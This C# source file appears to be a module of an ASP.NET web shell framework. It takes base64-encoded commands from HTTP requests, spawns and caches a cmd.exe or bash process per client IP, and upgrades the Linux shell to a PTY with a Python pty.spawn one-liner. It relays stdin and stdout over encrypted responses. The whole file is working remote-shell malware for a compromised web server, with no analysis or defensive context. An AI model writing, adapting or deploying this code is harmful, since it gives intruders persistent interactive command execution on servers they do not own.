using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Threading;

public class shell_virtual
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam)) return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }
        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null) return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            
            int nDllLength = 0;
            if (context.Items["len"] != null)
            {
                int.TryParse(context.Items["len"].ToString(), out nDllLength);
            }

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();
            Dictionary<string, string> dic = fnParseParams(szParam);

            StringBuilder sb = new StringBuilder();
            
            string szType = fnB64Decode(dic["z0"]);

            string session_proc = "shell_proc_" + request.UserHostAddress;
            string session_in   = "shell_in_" + request.UserHostAddress;
            string session_buf  = "shell_out_buf_" + request.UserHostAddress;

            if (szType.Equals("create", StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    int nPlatformId = (int)Environment.OSVersion.Platform;
                    bool bIsWindows = nPlatformId != 4 && nPlatformId != 6 && nPlatformId != 128;
                    ProcessStartInfo startInfo = new ProcessStartInfo();

                    if (bIsWindows)
                    {
                        startInfo.FileName = "cmd.exe";
                    }
                    else
                    {
                        startInfo.FileName = "/bin/bash";
                        startInfo.EnvironmentVariables["TERM"] = "xterm";
                    }

                    startInfo.UseShellExecute = false;
                    startInfo.RedirectStandardInput = true;
                    startInfo.RedirectStandardOutput = true;
                    startInfo.RedirectStandardError = true;
                    startInfo.CreateNoWindow = true;

                    Process process = new Process();
                    process.StartInfo = startInfo;
                    process.Start();

                    MemoryStream ms = new MemoryStream();

                    HttpRuntime.Cache.Insert(session_proc, process, null, System.Web.Caching.Cache.NoAbsoluteExpiration, TimeSpan.FromMinutes(30));
                    HttpRuntime.Cache.Insert(session_in, process.StandardInput.BaseStream, null, System.Web.Caching.Cache.NoAbsoluteExpiration, TimeSpan.FromMinutes(30));
                    HttpRuntime.Cache.Insert(session_buf, ms, null, System.Web.Caching.Cache.NoAbsoluteExpiration, TimeSpan.FromMinutes(30));

                    Thread t = new Thread(() =>
                    {
                        try
                        {
                            Stream isStream = process.StandardOutput.BaseStream;
                            byte[] bytes = new byte[4096];
                            int readLen;
                            while ((readLen = isStream.Read(bytes, 0, bytes.Length)) > 0)
                            {
                                lock (ms)
                                {
                                    ms.Write(bytes, 0, readLen);
                                }
                            }
                        }
                        catch (Exception) {}
                    });
                    t.Start();

                    if (!bIsWindows)
                    {
                        Stream os = process.StandardInput.BaseStream;
                        string szShell = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || python -c 'import pty; pty.spawn(\"/bin/bash\")'\n";
                        byte[] abRead = Encoding.UTF8.GetBytes(szShell);
                        os.Write(abRead, 0, abRead.Length);
                        os.Flush();
                    }

                    sb.Append("{\"status\":\"success\",\"msg\":\"PTY spawned and initialized successfully.\"}");
                }
                catch (Exception ex)
                {
                    sb.Append("{\"status\":\"failed\",\"msg\":\"" + ex.Message.Replace("\"", "\\\"") + "\"}");
                }
            }
            else if (szType.Equals("write", StringComparison.OrdinalIgnoreCase))
            {
                Stream osStream = HttpRuntime.Cache[session_in] as Stream;
                if (osStream != null)
                {
                    try
                    {
                        string z1Raw = dic.ContainsKey("z1") ? dic["z1"] : "";
                        string firstDecodeStr = Encoding.UTF8.GetString(Convert.FromBase64String(z1Raw));
                        byte[] szShellCmdBytes = Convert.FromBase64String(firstDecodeStr);

                        osStream.Write(szShellCmdBytes, 0, szShellCmdBytes.Length);
                        osStream.Flush();

                        sb.Append("{\"status\":\"success\",\"msg\":\"Bytes flushed to PTY stdin.\"}");
                    }
                    catch (Exception ex)
                    {
                        sb.Append("{\"status\":\"failed\",\"msg\":\"" + ex.Message.Replace("\"", "\\\"") + "\"}");
                    }
                }
                else
                {
                    sb.Append("{\"status\":\"failed\",\"msg\":\"No active stdin channel found.\"}");
                }
            }
            else if (szType.Equals("read", StringComparison.OrdinalIgnoreCase))
            {
                MemoryStream ms = HttpRuntime.Cache[session_buf] as MemoryStream;
                if (ms != null)
                {
                    byte[] currentBytes;
                    lock (ms)
                    {
                        currentBytes = ms.ToArray();
                        ms.SetLength(0);
                    }

                    string b64Output = Convert.ToBase64String(currentBytes);
                    sb.Append("{\"status\":\"success\",\"msg\":\"" + b64Output + "\"}");
                }
                else
                {
                    sb.Append("{\"status\":\"failed\",\"msg\":\"No active channel buffer found.\"}");
                }
            }
            else if (szType.Equals("stop", StringComparison.OrdinalIgnoreCase))
            {
                Process process = HttpRuntime.Cache[session_proc] as Process;
                if (process != null)
                {
                    try { process.Kill(); } catch (Exception) { }
                }

                HttpRuntime.Cache.Remove(session_proc);
                HttpRuntime.Cache.Remove(session_in);
                HttpRuntime.Cache.Remove(session_buf);

                sb.Append("{\"status\":\"stop\",\"msg\":\"Engine shutdown successfully.\"}");
            }

            string szOutput = sb.ToString(); 
            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(szOutput));

            context.ApplicationInstance.CompleteRequest();
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}